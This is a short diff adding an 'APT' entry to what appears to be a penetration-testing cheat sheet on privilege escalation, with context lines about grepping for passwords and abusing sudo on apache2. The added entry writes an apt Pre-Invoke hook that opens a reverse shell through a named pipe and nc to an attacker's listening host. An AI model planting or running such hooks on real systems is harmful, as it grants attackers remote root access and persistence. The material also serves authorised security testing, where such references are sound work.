@@ -3302,6 +3302,12 @@ grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPa
 sudo /usr/sbin/apache2 -f <FILE>
 ```
 
+##### APT
+
+```c
+echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"};' > /etc/apt/apt.conf.d/<FILE>
+```
+
 ##### arua2c
 
 ```c
